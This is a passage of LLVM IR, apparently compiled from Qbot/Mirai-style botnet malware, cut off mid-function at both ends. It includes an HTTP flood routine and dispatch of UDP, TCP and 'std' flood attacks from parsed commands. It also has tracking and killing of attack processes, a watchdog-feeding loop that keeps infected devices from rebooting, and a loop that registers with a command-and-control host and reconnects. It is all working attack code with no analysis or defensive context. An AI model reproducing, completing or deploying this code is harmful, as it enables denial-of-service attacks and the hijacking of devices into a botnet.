  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #8
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %7, label %8

; <label>:7:                                      ; preds = %2
  tail call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i64 0, i64 0)) #8
  tail call void @exit(i32 1) #14
  unreachable

; <label>:8:                                      ; preds = %2
  %9 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %10 = load i8**, i8*** %9, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %13 = bitcast %struct.in_addr* %12 to i8*
  %14 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %15 = load i32, i32* %14, align 4
  %16 = sext i32 %15 to i64
  call void @bcopy(i8* %11, i8* %13, i64 %16) #8
  %17 = tail call zeroext i16 @htons(i16 zeroext %1) #12
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %17, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = tail call i32 @socket(i32 2, i32 1, i32 6) #8
  %21 = bitcast i32* %4 to i8*
  %22 = call i32 @setsockopt(i32 %20, i32 6, i32 1, i8* nonnull %21, i32 4) #8
  %23 = icmp eq i32 %20, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %8
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.51, i64 0, i64 0)) #15
  call void @exit(i32 1) #14
  unreachable

; <label>:25:                                     ; preds = %8
  %26 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %27 = call i32 @connect(i32 %20, %struct.sockaddr* nonnull %26, i32 16) #8
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i64 0, i64 0)) #15
  call void @exit(i32 1) #14
  unreachable

; <label>:30:                                     ; preds = %25
  ret i32 %20
}

; Function Attrs: nounwind
declare void @herror(i8*) local_unnamed_addr #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #11

; Function Attrs: nounwind
declare void @perror(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @httpflood(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i64 @time(i64* null) #8
  %10 = icmp sgt i32 %5, 0
  br i1 %10, label %11, label %35

; <label>:11:                                     ; preds = %6
  %12 = zext i32 %4 to i64
  %13 = add i64 %9, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %15 = tail call i32 @rand() #8
  %16 = srem i32 %15, 39
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds [39 x i8*], [39 x i8*]* @UserAgents, i64 0, i64 %17
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %14, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.53, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %19) #8
  %sext = shl i64 %13, 32
  %21 = ashr exact i64 %sext, 32
  %22 = tail call i64 @time(i64* null) #8
  %23 = icmp sgt i64 %21, %22
  br i1 %23, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %11
  %24 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %25

; <label>:25:                                     ; preds = %.lr.ph, %.backedge
  %26 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %.backedge, label %28

; <label>:28:                                     ; preds = %25
  %29 = call i64 @strlen(i8* nonnull %14) #13
  %30 = call i64 @write(i32 %26, i8* nonnull %14, i64 %29) #8
  %31 = call i64 @read(i32 %26, i8* nonnull %24, i64 1) #8
  %32 = tail call i32 @close(i32 %26) #8
  br label %.backedge

.backedge:                                        ; preds = %28, %25
  %33 = tail call i64 @time(i64* null) #8
  %34 = icmp sgt i64 %21, %33
  br i1 %34, label %25, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %11
  tail call void @exit(i32 0) #14
  unreachable

; <label>:35:                                     ; preds = %6
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #4

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #7

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #8
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numattackpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numattackpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #8
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @attackpids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @attackpids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #8
  store i8* %8, i8** bitcast (i32** @attackpids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @stop_attack() local_unnamed_addr #1 {
  %1 = load i64, i64* @numattackpids, align 8
  %2 = icmp eq i64 %1, 0
  br i1 %2, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %15
  %.08 = phi i64 [ %16, %15 ], [ 0, %.lr.ph.preheader ]
  %3 = load i32*, i32** @attackpids, align 8
  %4 = getelementptr inbounds i32, i32* %3, i64 %.08
  %5 = load i32, i32* %4, align 4
  %6 = icmp eq i32 %5, 0
  br i1 %6, label %15, label %7

; <label>:7:                                      ; preds = %.lr.ph
  %8 = tail call i32 @getpid() #8
  %9 = icmp eq i32 %5, %8
  br i1 %9, label %15, label %10

; <label>:10:                                     ; preds = %7
  %11 = load i32*, i32** @attackpids, align 8
  %12 = getelementptr inbounds i32, i32* %11, i64 %.08
  %13 = load i32, i32* %12, align 4
  %14 = tail call i32 @kill(i32 %13, i32 9) #8
  br label %15

; <label>:15:                                     ; preds = %7, %.lr.ph, %10
  %16 = add i64 %.08, 1
  %17 = load i64, i64* @numattackpids, align 8
  %18 = icmp ult i64 %16, %17
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %15
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  ret void
}

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @registerme(i8*) local_unnamed_addr #1 {
  %2 = alloca [100 x i8], align 16
  %3 = getelementptr inbounds [100 x i8], [100 x i8]* %2, i64 0, i64 0
  %4 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %3, i64 100, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i64 0, i64 0), i8* %0) #8
  %5 = load i32, i32* @C2, align 4
  %6 = call i64 @strlen(i8* nonnull %3) #13
  %7 = call i64 @write(i32 %5, i8* nonnull %3, i64 %6) #8
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8* nocapture, i64, i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @resolve_http() local_unnamed_addr #1 {
  %1 = load i8*, i8** @c2_http_host, align 8
  %2 = tail call %struct.hostent* @gethostbyname(i8* %1) #8
  %3 = icmp eq %struct.hostent* %2, null
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  tail call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i64 0, i64 0)) #8
  br label %16

; <label>:5:                                      ; preds = %0
  %6 = getelementptr inbounds %struct.hostent, %struct.hostent* %2, i64 0, i32 4
  %7 = bitcast i8*** %6 to %struct.in_addr***
  %8 = load %struct.in_addr**, %struct.in_addr*** %7, align 8
  %9 = load %struct.in_addr*, %struct.in_addr** %8, align 8
  %10 = icmp eq %struct.in_addr* %9, null
  br i1 %10, label %16, label %11

; <label>:11:                                     ; preds = %5
  %12 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i64 0, i32 0
  %13 = load i32, i32* %12, align 4
  %14 = tail call i8* @inet_ntoa(i32 %13) #8
  %15 = tail call i8* @strcpy(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i64 0, i64 0), i8* %14) #8
  br label %16

; <label>:16:                                     ; preds = %5, %11, %4
  %.0 = phi i32 [ 1, %4 ], [ 0, %11 ], [ 1, %5 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @watchdog_maintain() local_unnamed_addr #1 {
  %1 = alloca i32, align 4
  store i32 1, i32* %1, align 4
  tail call void @table_unlock_val(i8 zeroext 1)
  tail call void @table_unlock_val(i8 zeroext 2)
  tail call void @table_unlock_val(i8 zeroext 3)
  tail call void @table_unlock_val(i8 zeroext 4)
  tail call void @table_unlock_val(i8 zeroext 5)
  tail call void @table_unlock_val(i8 zeroext 6)
  tail call void @table_unlock_val(i8 zeroext 7)
  %2 = tail call i8* @table_retrieve_val(i32 1, i32* null)
  %3 = tail call i32 (i8*, i32, ...) @open(i8* %2, i32 2) #8
  %4 = icmp eq i32 %3, -1
  br i1 %4, label %5, label %.thread

; <label>:5:                                      ; preds = %0
  %6 = tail call i8* @table_retrieve_val(i32 2, i32* null)
  %7 = tail call i32 (i8*, i32, ...) @open(i8* %6, i32 2) #8
  %8 = icmp eq i32 %7, -1
  br i1 %8, label %9, label %.thread

; <label>:9:                                      ; preds = %5
  %10 = tail call i8* @table_retrieve_val(i32 3, i32* null)
  %11 = tail call i32 (i8*, i32, ...) @open(i8* %10, i32 2) #8
  %12 = icmp eq i32 %11, -1
  br i1 %12, label %13, label %.thread

; <label>:13:                                     ; preds = %9
  %14 = tail call i8* @table_retrieve_val(i32 4, i32* null)
  %15 = tail call i32 (i8*, i32, ...) @open(i8* %14, i32 2) #8
  %16 = icmp eq i32 %15, -1
  br i1 %16, label %17, label %.thread

; <label>:17:                                     ; preds = %13
  %18 = tail call i8* @table_retrieve_val(i32 5, i32* null)
  %19 = tail call i32 (i8*, i32, ...) @open(i8* %18, i32 2) #8
  %20 = icmp eq i32 %19, -1
  br i1 %20, label %21, label %.thread

; <label>:21:                                     ; preds = %17
  %22 = tail call i8* @table_retrieve_val(i32 6, i32* null)
  %23 = tail call i32 (i8*, i32, ...) @open(i8* %22, i32 2) #8
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %.thread

; <label>:25:                                     ; preds = %21
  %26 = tail call i8* @table_retrieve_val(i32 7, i32* null)
  %27 = tail call i32 (i8*, i32, ...) @open(i8* %26, i32 2) #8
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %45, label %.thread

.thread:                                          ; preds = %0, %5, %9, %13, %17, %21, %25
  %.sroa.19.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ 0, %9 ], [ 0, %13 ], [ 0, %17 ], [ 0, %21 ], [ %27, %25 ]
  %.sroa.16.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ 0, %9 ], [ 0, %13 ], [ 0, %17 ], [ %23, %21 ], [ -1, %25 ]
  %.sroa.13.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ 0, %9 ], [ 0, %13 ], [ %19, %17 ], [ -1, %21 ], [ -1, %25 ]
  %.sroa.10.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ 0, %9 ], [ %15, %13 ], [ -1, %17 ], [ -1, %21 ], [ -1, %25 ]
  %.sroa.7.0 = phi i32 [ 0, %0 ], [ 0, %5 ], [ %11, %9 ], [ -1, %13 ], [ -1, %17 ], [ -1, %21 ], [ -1, %25 ]
  %.sroa.4.0 = phi i32 [ 0, %0 ], [ %7, %5 ], [ -1, %9 ], [ -1, %13 ], [ -1, %17 ], [ -1, %21 ], [ -1, %25 ]
  %29 = call i32 (i32, i64, ...) @ioctl(i32 %3, i64 2147768068, i32* nonnull %1) #8
  %30 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.4.0, i64 2147768068, i32* nonnull %1) #8
  %31 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.7.0, i64 2147768068, i32* nonnull %1) #8
  %32 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.10.0, i64 2147768068, i32* nonnull %1) #8
  %33 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.13.0, i64 2147768068, i32* nonnull %1) #8
  %34 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.16.0, i64 2147768068, i32* nonnull %1) #8
  %35 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.19.0, i64 2147768068, i32* nonnull %1) #8
  br label %36

; <label>:36:                                     ; preds = %.thread, %36
  %37 = call i32 (i32, i64, ...) @ioctl(i32 %3, i64 2147768069, i32 0) #8
  %38 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.4.0, i64 2147768069, i32 0) #8
  %39 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.7.0, i64 2147768069, i32 0) #8
  %40 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.10.0, i64 2147768069, i32 0) #8
  %41 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.13.0, i64 2147768069, i32 0) #8
  %42 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.16.0, i64 2147768069, i32 0) #8
  %43 = call i32 (i32, i64, ...) @ioctl(i32 %.sroa.19.0, i64 2147768069, i32 0) #8
  %44 = call i32 @sleep(i32 3) #8
  br label %36

; <label>:45:                                     ; preds = %25
  tail call void @table_lock_val(i8 zeroext 1)
  tail call void @table_lock_val(i8 zeroext 2)
  tail call void @table_lock_val(i8 zeroext 3)
  tail call void @table_lock_val(i8 zeroext 4)
  tail call void @table_lock_val(i8 zeroext 5)
  tail call void @table_lock_val(i8 zeroext 6)
  tail call void @table_lock_val(i8 zeroext 7)
  ret void
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #7

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #7

; Function Attrs: noinline nounwind uwtable
define void @proc_cmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i8* @strstr(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.56, i64 0, i64 0)) #13
  %5 = icmp eq i8* %4, null
  br i1 %5, label %6, label %15

; <label>:6:                                      ; preds = %2
  %7 = tail call i8* @strstr(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0)) #13
  %8 = icmp eq i8* %7, null
  br i1 %8, label %9, label %15

; <label>:9:                                      ; preds = %6
  %10 = tail call i8* @strstr(i8* %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i64 0, i64 0)) #13
  %11 = icmp eq i8* %10, null
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %9
  %13 = tail call i8* @strstr(i8* %3, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.59, i64 0, i64 0)) #13
  %14 = icmp eq i8* %13, null
  br i1 %14, label %16, label %15

; <label>:15:                                     ; preds = %12, %9, %6, %2
  tail call void @stop_attack()
  %.pre = load i8*, i8** %1, align 8
  br label %16

; <label>:16:                                     ; preds = %12, %15
  %17 = phi i8* [ %3, %12 ], [ %.pre, %15 ]
  %18 = tail call i8* @strstr(i8* %17, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.60, i64 0, i64 0)) #13
  %19 = icmp eq i8* %18, null
  br i1 %19, label %20, label %23

; <label>:20:                                     ; preds = %16
  %21 = tail call i8* @strstr(i8* %17, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i64 0, i64 0)) #13
  %22 = icmp eq i8* %21, null
  br i1 %22, label %40, label %23

; <label>:23:                                     ; preds = %20, %16
  %24 = icmp eq i32 %0, 5
  br i1 %24, label %25, label %118

; <label>:25:                                     ; preds = %23
  %26 = tail call i32 @listFork()
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %118

; <label>:28:                                     ; preds = %25
  %29 = getelementptr inbounds i8*, i8** %1, i64 1
  %30 = load i8*, i8** %29, align 8
  %31 = getelementptr inbounds i8*, i8** %1, i64 2
  %32 = load i8*, i8** %31, align 8
  %33 = tail call i32 @atoi(i8* %32) #13
  %34 = getelementptr inbounds i8*, i8** %1, i64 3
  %35 = load i8*, i8** %34, align 8
  %36 = tail call i32 @atoi(i8* %35) #13
  %37 = getelementptr inbounds i8*, i8** %1, i64 4
  %38 = load i8*, i8** %37, align 8
  %39 = tail call i32 @atoi(i8* %38) #13
  tail call void @udpflood(i8* %30, i32 %33, i32 %36, i32 %39)
  %.pre45 = load i8*, i8** %1, align 8
  br label %40

; <label>:40:                                     ; preds = %20, %28
  %41 = phi i8* [ %17, %20 ], [ %.pre45, %28 ]
  %42 = tail call i8* @strstr(i8* %41, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i64 0, i64 0)) #13
  %43 = icmp eq i8* %42, null
  br i1 %43, label %44, label %47

; <label>:44:                                     ; preds = %40
  %45 = tail call i8* @strstr(i8* %41, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i64 0, i64 0)) #13
  %46 = icmp eq i8* %45, null
  br i1 %46, label %66, label %47

; <label>:47:                                     ; preds = %44, %40
  %48 = icmp eq i32 %0, 6
  br i1 %48, label %49, label %118

; <label>:49:                                     ; preds = %47
  %50 = tail call i32 @listFork()
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %52, label %118

; <label>:52:                                     ; preds = %49
  %53 = getelementptr inbounds i8*, i8** %1, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = getelementptr inbounds i8*, i8** %1, i64 2
  %56 = load i8*, i8** %55, align 8
  %57 = tail call i32 @atoi(i8* %56) #13
  %58 = getelementptr inbounds i8*, i8** %1, i64 3
  %59 = load i8*, i8** %58, align 8
  %60 = tail call i32 @atoi(i8* %59) #13
  %61 = getelementptr inbounds i8*, i8** %1, i64 4
  %62 = load i8*, i8** %61, align 8
  %63 = tail call i32 @atoi(i8* %62) #13
  %64 = getelementptr inbounds i8*, i8** %1, i64 5
  %65 = load i8*, i8** %64, align 8
  tail call void @tcpflood(i8* %54, i32 %57, i32 %60, i32 %63, i8* %65)
  %.pre46 = load i8*, i8** %1, align 8
  br label %66

; <label>:66:                                     ; preds = %44, %52
  %67 = phi i8* [ %41, %44 ], [ %.pre46, %52 ]
  %68 = tail call i8* @strstr(i8* %67, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #13
  %69 = icmp eq i8* %68, null
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %66
  %71 = tail call i8* @strstr(i8* %67, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i64 0, i64 0)) #13
  %72 = icmp eq i8* %71, null
  br i1 %72, label %90, label %73

; <label>:73:                                     ; preds = %70, %66
  %74 = icmp eq i32 %0, 5
  br i1 %74, label %75, label %118

; <label>:75:                                     ; preds = %73
  %76 = tail call i32 @listFork()
  %77 = icmp eq i32 %76, 0
  br i1 %77, label %78, label %118

; <label>:78:                                     ; preds = %75
  %79 = getelementptr inbounds i8*, i8** %1, i64 1
  %80 = load i8*, i8** %79, align 8
  %81 = getelementptr inbounds i8*, i8** %1, i64 2
  %82 = load i8*, i8** %81, align 8
  %83 = tail call i32 @atoi(i8* %82) #13
  %84 = getelementptr inbounds i8*, i8** %1, i64 3
  %85 = load i8*, i8** %84, align 8
  %86 = tail call i32 @atoi(i8* %85) #13
  %87 = getelementptr inbounds i8*, i8** %1, i64 4
  %88 = load i8*, i8** %87, align 8
  %89 = tail call i32 @atoi(i8* %88) #13
  tail call void @stdflood(i8* %80, i32 %83, i32 %86, i32 %89)
  unreachable

; <label>:90:                                     ; preds = %70
  %91 = tail call i8* @strstr(i8* %67, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.66, i64 0, i64 0)) #13
  %92 = icmp eq i8* %91, null
  br i1 %92, label %93, label %97

; <label>:93:                                     ; preds = %90
  %94 = tail call i8* @strstr(i8* %67, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0)) #13
  %95 = icmp ne i8* %94, null
  %96 = icmp eq i32 %0, 7
  %or.cond = and i1 %96, %95
  br i1 %or.cond, label %98, label %118

; <label>:97:                                     ; preds = %90
  %.old = icmp eq i32 %0, 7
  br i1 %.old, label %98, label %118

; <label>:98:                                     ; preds = %93, %97
  %99 = tail call i32 @listFork()
  %100 = icmp eq i32 %99, 0
  br i1 %100, label %101, label %118

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds i8*, i8** %1, i64 1
  %103 = load i8*, i8** %102, align 8
  %104 = getelementptr inbounds i8*, i8** %1, i64 2
  %105 = load i8*, i8** %104, align 8
  %106 = getelementptr inbounds i8*, i8** %1, i64 3
  %107 = load i8*, i8** %106, align 8
  %108 = tail call i32 @atoi(i8* %107) #13
  %109 = trunc i32 %108 to i16
  %110 = getelementptr inbounds i8*, i8** %1, i64 4
  %111 = load i8*, i8** %110, align 8
  %112 = getelementptr inbounds i8*, i8** %1, i64 5
  %113 = load i8*, i8** %112, align 8
  %114 = tail call i32 @atoi(i8* %113) #13
  %115 = getelementptr inbounds i8*, i8** %1, i64 6
  %116 = load i8*, i8** %115, align 8
  %117 = tail call i32 @atoi(i8* %116) #13
  tail call void @httpflood(i8* %103, i8* %105, i16 zeroext %109, i8* %111, i32 %114, i32 %117)
  br label %118

; <label>:118:                                    ; preds = %93, %25, %23, %49, %47, %75, %73, %98, %97, %101
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define void @parse_buffer(i8*) local_unnamed_addr #1 {
  %2 = alloca [11 x i8*], align 16
  %3 = bitcast [11 x i8*]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 88, i32 16, i1 false)
  %4 = tail call i8* @strtok(i8* %0, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0)) #8
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph17.preheader

.lr.ph17.preheader:                               ; preds = %1
  br label %.lr.ph17

.lr.ph17:                                         ; preds = %.lr.ph17.preheader, %.lr.ph17
  %indvars.iv19 = phi i64 [ %indvars.iv.next20, %.lr.ph17 ], [ 0, %.lr.ph17.preheader ]
  %6 = phi i8* [ %12, %.lr.ph17 ], [ %4, %.lr.ph17.preheader ]
  %7 = tail call i64 @strlen(i8* nonnull %6) #13
  %8 = add i64 %7, 1
  %9 = tail call noalias i8* @malloc(i64 %8) #8
  %indvars.iv.next20 = add nuw nsw i64 %indvars.iv19, 1
  %10 = getelementptr inbounds [11 x i8*], [11 x i8*]* %2, i64 0, i64 %indvars.iv19
  store i8* %9, i8** %10, align 8
  %11 = tail call i8* @strcpy(i8* %9, i8* nonnull %6) #8
  %12 = tail call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i64 0, i64 0)) #8
  %13 = icmp ne i8* %12, null
  %14 = icmp slt i64 %indvars.iv.next20, 10
  %15 = and i1 %14, %13
  br i1 %15, label %.lr.ph17, label %._crit_edge18

._crit_edge18:                                    ; preds = %.lr.ph17
  %16 = trunc i64 %indvars.iv.next20 to i32
  %17 = icmp sgt i32 %16, 0
  br i1 %17, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %._crit_edge18
  %18 = getelementptr inbounds [11 x i8*], [11 x i8*]* %2, i64 0, i64 0
  call void @proc_cmd(i32 %16, i8** nonnull %18)
  %wide.trip.count = and i64 %indvars.iv.next20, 4294967295
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %19 = getelementptr inbounds [11 x i8*], [11 x i8*]* %2, i64 0, i64 %indvars.iv
  %20 = load i8*, i8** %19, align 8
  call void @free(i8* %20) #8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1, %._crit_edge18
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @qbot() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #8
  %2 = icmp sgt i32 %1, 0
  br i1 %2, label %.loopexit, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @resolve_http()
  br label %5

; <label>:5:                                      ; preds = %33, %3
  %6 = load i32, i32* @C2, align 4
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0) #8
  %8 = or i32 %7, 2048
  %9 = tail call i32 (i32, i32, ...) @fcntl(i32 %6, i32 4, i32 %8) #8
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #8
  store i32 %10, i32* @C2, align 4
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %5
  %13 = tail call i32 @close(i32 -1) #8
  %14 = tail call i32 @close(i32 0) #8
  br label %15

; <label>:15:                                     ; preds = %12, %5
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i64 0, i32 0), align 4
  %16 = tail call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i64 0, i64 0)) #8
  store i32 %16, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i64 0, i32 2, i32 0), align 4
  %17 = load i32, i32* @c2_bot_port, align 4
  %18 = trunc i32 %17 to i16
  %19 = tail call zeroext i16 @htons(i16 zeroext %18) #12
  store i16 %19, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @Socket, i64 0, i32 1), align 2
  %20 = load i32, i32* @C2, align 4
  %21 = tail call i32 @connect(i32 %20, %struct.sockaddr* bitcast (%struct.sockaddr_in* @Socket to %struct.sockaddr*), i32 16) #8
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %23, label %38

; <label>:23:                                     ; preds = %15
  %24 = load i32, i32* @retry, align 4
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %26, label %30

; <label>:26:                                     ; preds = %23
  %27 = load i32, i32* @C2, align 4
  %28 = tail call i32 @close(i32 %27) #8
  %29 = tail call i32 @close(i32 0) #8
  br label %.loopexit

; <label>:30:                                     ; preds = %23
  %31 = load i32, i32* @tryagain, align 4
  %32 = icmp eq i32 %31, 1
  br i1 %32, label %33, label %.loopexit.loopexit

; <label>:33:                                     ; preds = %30
  %34 = load i32, i32* @C2, align 4
  %35 = tail call i32 @close(i32 %34) #8
